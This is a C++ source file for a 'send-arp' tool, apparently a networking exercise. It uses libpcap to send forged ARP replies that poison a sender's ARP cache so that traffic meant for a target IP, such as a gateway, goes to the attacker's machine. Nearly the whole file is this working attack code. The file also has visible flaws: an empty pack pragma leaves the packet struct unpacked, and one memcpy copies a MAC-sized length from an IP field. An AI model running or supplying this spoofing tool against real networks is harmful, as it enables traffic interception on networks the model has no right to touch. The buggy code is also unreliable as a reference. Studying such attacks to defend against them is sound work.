#include <cstdio>
#include <unistd.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getaddr.h"	// get attacker&sender address info

#pragma pack(push, 1)
#pragma pack(pop)

struct EthArpPacket {
        EthHdr eth_;
        ArpHdr arp_;
};

void usage() {
        printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
        printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int checkFormat(int argc, char* argv[]) {
	if(argc < 3 || argc%2 == 1)
		return -1;
	for(int i = 2 ; i < argc ; i++){
		unsigned int a, b, c, d;
        	int res = sscanf(argv[i], "%u.%u.%u.%u", &a, &b, &c, &d);
        	if (res != 4)
			return -1;
	}

	return 0;
}

void printMac(Mac mac) {
	uint8_t a[6];
	memcpy(a, &mac, sizeof(Mac));
	for(int i = 0 ; i < 6 ; i++) {
		printf("%02x", a[i]);
		if(i < 5)
			printf(":");
	}
}

void printIp(Ip ip) {
	int a;
	memcpy(&a, &ip, sizeof(Ip));
	printf("%d.%d.%d.%d", ((a&0xff)), ((a&0xff00)>>8), ((a&0xff0000)>>16), ((a&0xff000000)>>24));
}

void printAtkAddr(Mac atkmac, Ip atkip) {
	printf("============================\n");
	printf("attacker info\n");
	printf("Mac addr : ");
	printMac(atkmac);
	printf("\n");
	printf("Ip addr : ");
	printIp(atkip);
	printf("\n");
	printf("============================\n\n\n");
}

void printSndAddr(Mac sndmac, Ip sndip, Ip trgip) {
	printf("============================\n");
        printf("sender info\n");
        printf("Mac addr : ");
        printMac(sndmac);
        printf("\n");
        printf("Ip addr : ");
        printIp(sndip);
        printf("\n");
	printf("target info\n");
	printf("Ip addr : ");
	printIp(trgip);
	printf("\n");
        printf("============================\n");
}

int attack(char* interface, Mac atkmac, Ip atkip, Mac sndmac, Ip sndip, Ip trgip) {
	char* dev = interface;
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
        }

        EthArpPacket packet;

        memcpy(&packet.eth_.dmac_, &sndmac, sizeof(Mac));
        memcpy(&packet.eth_.smac_, &atkmac, sizeof(Mac));
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
	memcpy(&packet.arp_.smac_, &atkmac, sizeof(Mac));
	memcpy(&packet.arp_.sip_, &trgip, sizeof(Ip));
	memcpy(&packet.arp_.tmac_, &sndmac, sizeof(Mac));
	memcpy(&packet.arp_.tip_, &sndip, sizeof(Mac));
	printf("now attacking...\n");
        for(int i = 0 ; i < 5 ; i++) {
        	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        	if (res != 0) {
                	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        	}
        	sleep(3);
        }
        pcap_close(handle);
	return 0;
}

int main(int argc, char* argv[]) {
	if (checkFormat(argc, argv)) {
		usage();
		return -1;
	}

	Mac atkmac;
	printf("trying to catch attacker mac, ip address...\n");
	if(getAtkMac(&atkmac)) {
		printf("cant get attacker mac address\n");
		return -1;
	}
	Ip atkip;
	if(getAtkIp(&atkip)) {
		printf("cant get attacker ip address\n");
		return -1;
	}

	printAtkAddr(atkmac, atkip);
	for(int i = 0 ; i < (argc - 2) / 2 ; i++) {
		Mac sndmac;
		Ip sndip = htonl(Ip(argv[2*i + 2]));
		Mac trgmac;
		Ip trgip = htonl(Ip(argv[2*i + 3]));

		printf("attack attempt number %d...\n", i + 1);
		printf("trying to catch sender mac address...\n");

		if(getSndMac(argv[1], &sndmac, &sndip, &atkmac, &atkip)){
			printf("failed to catch sender mac address\n\n\n");
			continue;
		}

		printSndAddr(sndmac, sndip, trgip);

		if(attack(argv[1], atkmac, atkip, sndmac, sndip, trgip)){
			printf("attack failed\n\n\n");
			continue;
		}
		
		printf("\n\n\n");
	}

	return 0;
}
